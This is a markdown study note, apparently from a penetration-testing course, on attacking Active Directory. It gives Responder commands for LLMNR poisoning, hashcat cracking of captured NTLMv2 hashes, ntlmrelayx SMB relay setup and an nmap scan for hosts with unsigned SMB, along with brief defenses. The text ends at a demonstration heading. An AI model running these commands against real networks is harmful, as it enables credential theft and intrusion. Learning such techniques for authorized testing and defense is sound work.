# ACTIVE DIRECTORY

Directory services developed by Microsoft to manage windows domain networks.
Stores information related objects, such as Computers, Users, Printers etc. (Acts like a phonebook for Windows).
Authenticates using kerberos - Non-windows devices such as Linux machines, firewalls etc. can also authenticate to Active Directory via RADIUS or LDAP.


# ATTACKING ACTIVE DIRECTORY 
First we need to find our way into the network through abusing features of windows.

**1---LLMNR POISONING**

Link Local Multicast & Name Resolution- used to Identify hosts when DNS fails to do so.
Previously known as NBT_NS.
Key flaw is that the services utilize a user's username and NTLMV2 hash when appropriately responded to.
We will use a tool called `Responder`

`python Responder.py -I tun0 -rdw -V`

Run the tool and wait for connection :

STEPS:
- Run Responder
- An Event occurs
- Get some hashes
- Crack the hashes 

**Capturing NTLMV2 Hashes with Responder**

 `responder -I eth0 -rdwv`
 
 **Password cracking with Hashcats**
 
 copy and paste the hashes collected:
 
 `gedit hashes.txt`
 
 paste the hashes and save
 
 `hashcat -m 5600 hashes.txt rockyou.txt --force`
 
 **LLMNR Poisoning defenses**
 
 Best defense is to disable LLMNR & NBT-NS.
 If you have to use or cannot disable LLMNR/NBT-NS;
 
 - Enable Network Access Control
 - Use Strong User Password

**2---SMB RELAY ATTACKS**

SMB signing is a packet level protocol.
Instead of cracking hashes gathered with Responder, we can instead relay these hashes to specific machines and potentially gain access.

Requirements:

- SMB signing must be disabled on the target.
- Relayed user credentials must be admin on machine.

Run Responder:

`gedit Responder.conf` - Turn off SMB & HTTP

`python Responder.py -I tun0 -rdw -v`

Set up your relay:

`python ntlmrelayx.py -tf targets.txt -smb2support`

NTLM relay x takes the relay, it passes it to a target file specified.

**Discovery Hosts with SMB Signing Disabled**

Using nmap to do a quick check:

`nmap --script=smb2-security-mode.nse -p445 192.168.57.0/24`

**SMB Relay Attack Demonstration**
